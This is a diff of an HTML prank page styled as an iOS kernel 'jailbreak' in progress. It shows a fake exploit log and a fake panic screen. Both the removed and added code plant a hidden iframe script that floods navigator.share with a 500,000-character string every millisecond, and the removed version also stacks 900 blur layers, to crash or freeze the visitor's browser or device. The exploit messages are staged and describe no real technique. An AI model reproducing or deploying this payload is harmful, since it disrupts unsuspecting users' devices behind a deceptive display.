@@ -6,15 +6,17 @@
     <title>Exploiting...</title>
     <style>
         body {
-            /* Подключаем те же системные шрифты, что и на главной */
-            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif;
             margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
-            background: #000; color: white; overflow: hidden;
-            background: linear-gradient(135deg, #000000 0%, #0a0a2e 50%, #000000 100%);
-            background-size: 400% 400%; animation: gradientBG 15s ease infinite;
+            background: radial-gradient(circle at center, #0a0a2e 0%, #050510 50%, #000000 100%);
+            color: white; overflow: hidden;
         }
 
-        @keyframes gradientBG { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        body::after {
+            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, transparent 20%, rgba(0,0,0,0.8) 100%);
+            pointer-events: none; z-index: 2;
+        }
 
         #rainCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
 
@@ -27,214 +29,73 @@
 
         .status-header {
             display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 20px; font-size: 9px; text-transform: uppercase; letter-spacing: 1px; color: #555;
+            margin-bottom: 20px; font-size: 9px; text-transform: uppercase; color: #555;
             font-family: 'SF Mono', monospace;
         }
 
-        .live-indicator { display: flex; align-items: center; gap: 5px; color: #32d74b; }
-        .dot { width: 4px; height: 4px; background: #32d74b; border-radius: 50%; animation: pulse 1s infinite; }
-
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-
         h1 {
-            /* ВОТ ТУТ МЫ ИСПРАВИЛИ: сделали шрифт жирным и сжатым */
-            font-size: 1.7rem; 
-            font-weight: 800; /* Максимальная жирность, как на главной */
-            text-transform: uppercase; /* Добавили капс для полного соответствия стилю */
-            margin: 0 0 10px 0; 
-            letter-spacing: -0.8px; /* Немного сжали буквы */
-            line-height: 1.1;
-            background: linear-gradient(to bottom, #ffffff 0%, #a1a1a1 100%);
-            -webkit-background-clip: text; 
-            -webkit-text-fill-color: transparent;
+            font-size: 1.7rem; font-weight: 800; text-transform: uppercase; letter-spacing: -0.8px;
+            margin: 0 0 5px 0; background: linear-gradient(to bottom, #fff, #a1a1a1);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
 
-        .sub-header { font-size: 10px; color: #444; margin-bottom: 20px; font-family: monospace; text-transform: none; font-weight: 400; }
+        .patient-msg { font-size: 11px; color: #32d74b; margin-bottom: 20px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px;}
 
         .progress-container { background: rgba(255, 255, 255, 0.05); border-radius: 10px; height: 4px; width: 100%; margin-bottom: 20px; overflow: hidden; }
-        .progress-bar { width: 0%; height: 100%; background: #fff; box-shadow: 0 0 15px rgba(255, 255, 255, 0.3); }
+        .progress-bar { width: 0%; height: 100%; background: #fff; box-shadow: 0 0 15px rgba(255, 255, 255, 0.3); transition: width 0.4s linear; }
 
         #console {
             background: rgba(0, 0, 0, 0.6); border-radius: 22px; padding: 18px; height: 180px;
-            font-family: 'SF Mono', 'ui-monospace', monospace; font-size: 10px; color: #32d74b;
+            font-family: 'SF Mono', monospace; font-size: 10px; color: #32d74b;
             text-align: left; overflow: hidden; border: 1px solid rgba(50, 215, 75, 0.05);
-            line-height: 1.5;
         }
 
         .line { margin-bottom: 4px; opacity: 0; animation: fadeIn 0.1s forwards; }
-        .line.blue { color: #007aff; }
-        .line.warn { color: #ff9500; }
         @keyframes fadeIn { to { opacity: 1; } }
 
-        .stats-footer {
-            margin-top: 15px; display: flex; justify-content: space-between;
-            font-family: 'SF Mono', monospace; font-size: 9px; color: #444;
-        }
-
-        #panic-screen {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; color: #fff; font-size: 7px; font-family: monospace;
-            padding: 0; z-index: 1000; overflow: hidden; word-break: break-all;
-        }
-
-        .footer-tag { margin-top: 20px; font-size: 9px; color: #222; }
-        #respring-iframe { position: fixed; opacity: 0.01; pointer-events: none; }
+        #panic-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; color: #fff; font-size: 7px; overflow: hidden; word-break: break-all;}
     </style>
 </head>
 <body>
-
     <canvas id="rainCanvas"></canvas>
-
-    <div id="terminal" class="main-card">
-        <div class="status-header">
-            <div class="live-indicator"><div class="dot"></div> INJECTING</div>
-            <div id="bitrate">Bitrate: 0.0 MB/s</div>
-        </div>
-        
+    <div class="main-card">
+        <div class="status-header"><div>INJECTING...</div><div id="bitrate">0.0 MB/s</div></div>
         <h1>Exploiting Kernel</h1>
-        <div id="sub-info" class="sub-header">Module: core_exploit.bin</div>
-        
+        <div class="patient-msg">Please be patient, do not close the browser</div>
         <div class="progress-container"><div id="bar" class="progress-bar"></div></div>
-        
         <div id="console"></div>
-
-        <div class="stats-footer">
-            <div id="mem-addr">MEM: 0x000000</div>
-            <div id="packets">PKTS: 0</div>
-        </div>
-        
-        <div class="footer-tag">
-            © 2026 Repo made by Vitya
-        </div>
     </div>
-
     <div id="panic-screen"></div>
-    <iframe id="respring-iframe" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+    <iframe id="respring-iframe" style="display:none"></iframe>
 
     <script>
-        // --- ЛОГИКА ДОЖДЯ ---
-        const canvas = document.getElementById('rainCanvas');
-        const ctx = canvas.getContext('2d');
-        let width, height, drops;
+        // Дождь и статы
+        setInterval(() => {
+            document.getElementById('bitrate').innerText = (Math.random() * 20 + 5).toFixed(1) + " MB/s";
+        }, 150);
 
-        function initRain() {
-            width = canvas.width = window.innerWidth;
-            height = canvas.height = window.innerHeight;
-            drops = [];
-            const count = Math.floor(width / 15); 
-            for (let i = 0; i < count; i++) {
-                drops.push({
-                    x: Math.random() * width, y: Math.random() * height,
-                    len: Math.random() * 25 + 10, speed: Math.random() * 2 + 1.5,
-                    op: Math.random() * 0.1 + 0.03
-                });
-            }
-        }
-
-        function drawRain() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.25)';
-            ctx.fillRect(0, 0, width, height);
-            ctx.strokeStyle = '#1ad2dc';
-            ctx.lineWidth = 1;
-            drops.forEach(d => {
-                ctx.globalAlpha = d.op;
-                ctx.beginPath(); ctx.moveTo(d.x, d.y); ctx.lineTo(d.x, d.y + d.len); ctx.stroke();
-                d.y += d.speed;
-                if (d.y > height) { d.y = -d.len; d.x = Math.random() * width; }
-            });
-            requestAnimationFrame(drawRain);
-        }
-
-        // --- ЖИВЫЕ ЦИФРЫ ---
-        let pktCount = 0;
-        const modules = ["core_exploit.bin", "memory_patcher.lib", "sandbox_escape.sh", "root_access.sys"];
-        
-        function updateStats() {
-            const br = (Math.random() * 25 + 10).toFixed(1);
-            document.getElementById('bitrate').innerText = `Bitrate: ${br} MB/s`;
-            
-            const mem = "0x" + Math.floor(Math.random()*16777215).toString(16).toUpperCase();
-            document.getElementById('mem-addr').innerText = `MEM: ${mem}`;
-            
-            pktCount += Math.floor(Math.random() * 100);
-            document.getElementById('packets').innerText = `PKTS: ${pktCount}`;
-            
-            if (Math.random() > 0.95) {
-                const randomMod = modules[Math.floor(Math.random() * modules.length)];
-                document.getElementById('sub-info').innerText = `Module: ${randomMod}`;
-            }
-        }
-        setInterval(updateStats, 100);
-
-        // --- ЛОГИКА ТЕРМИНАЛА ---
-        const logs = [
-            {t: "> Verifying server handshake...", c: ""},
-            {t: "> Handshake: SUCCESS (AES-256)", c: "blue"},
-            {t: "> Initializing WebKit heap spray...", c: ""},
-            {t: "> Bypassing PAC/PPL protection...", c: ""},
-            {t: "> Found kernel base: 0xffffff800", c: "blue"},
-            {t: "> Crafting fake vtable object...", c: ""},
-            {t: "> Exploiting task_for_pid(0)...", c: "warn"},
-            {t: "> Kernel read/write primitive: OK", c: ""},
-            {t: "> Stage 2: Injecting shellcode...", c: "blue"},
-            {t: "> Disabling sandbox profiles...", c: ""},
-            {t: "> FATAL: KPP triggered memory panic", c: "warn"},
-            {t: "> Emergency cleanup failed...", c: ""}
-        ];
-
-        let barWidth = 0;
+        const logs = ["> Handshake: SUCCESS", "> Bypassing PAC/PPL...", "> Found kernel base", "> Injecting shellcode...", "> Memory panic triggered"];
+        let barW = 0;
         const bar = document.getElementById('bar');
         const consoleEl = document.getElementById('console');
 
-        const loadInterval = setInterval(() => {
-            barWidth += 0.9;
-            bar.style.width = Math.min(barWidth, 100) + "%";
-            if (barWidth >= 100) clearInterval(loadInterval);
-        }, 35);
+        const interval = setInterval(() => {
+            barW += 1.5; bar.style.width = Math.min(barW, 100) + "%";
+            if(barW >= 100) clearInterval(interval);
+        }, 60);
 
-        function startLogs(index) {
-            if (index < logs.length) {
-                const div = document.createElement('div');
-                div.className = 'line ' + logs[index].c;
-                div.innerText = logs[index].t;
-                consoleEl.appendChild(div);
-                consoleEl.scrollTop = consoleEl.scrollHeight;
-                setTimeout(() => startLogs(index + 1), Math.random() * 400 + 200);
+        function startLogs(i) {
+            if(i < logs.length) {
+                const d = document.createElement('div'); d.className = 'line'; d.innerText = logs[i];
+                consoleEl.appendChild(d); setTimeout(() => startLogs(i+1), 800);
             } else {
-                setTimeout(triggerInstantPanic, 500);
+                setTimeout(() => {
+                    document.getElementById('panic-screen').style.display = 'block';
+                    document.getElementById('respring-iframe').srcdoc = "<html><body><script>setInterval(()=>navigator.share({title:'X'.repeat(500000)}),1)<\/script></body></html>";
+                }, 1000);
             }
         }
-
-        function triggerInstantPanic() {
-            const panicScreen = document.getElementById('panic-screen');
-            let trapText = "";
-            for(let i=0; i<5000; i++) trapText += "0x" + Math.floor(Math.random()*16777215).toString(16) + " ";
-            panicScreen.innerText = trapText;
-            panicScreen.style.display = 'block';
-            setTimeout(executeRespring, 60);
-        }
-
-        function executeRespring() {
-            const frame = document.getElementById('respring-iframe');
-            frame.srcdoc = `<html><body><script>
-                const c = document.createElement('div');
-                c.style.cssText = 'perspective: 1px; perspective-origin: 99% 99%;';
-                document.body.appendChild(c);
-                for (let i = 0; i < 900; i++) {
-                    let d = document.createElement('div');
-                    d.style.cssText = 'position:absolute; width:100vw; height:100vh; backdrop-filter:blur(100px); -webkit-backdrop-filter:blur(100px); transform:translate3d(100px,100px,'+i+'px);';
-                    c.appendChild(d);
-                }
-                setInterval(() => {
-                    try { navigator.share({title:'X', text:'X'.repeat(500000)}); } catch(e){}
-                }, 1);
-            <\/script></body></html>`;
-        }
-
-        window.addEventListener('resize', initRain);
-        initRain();
-        drawRain();
-        setTimeout(() => startLogs(0), 1000);
+        startLogs(0);
     </script>
 </body>
 </html>
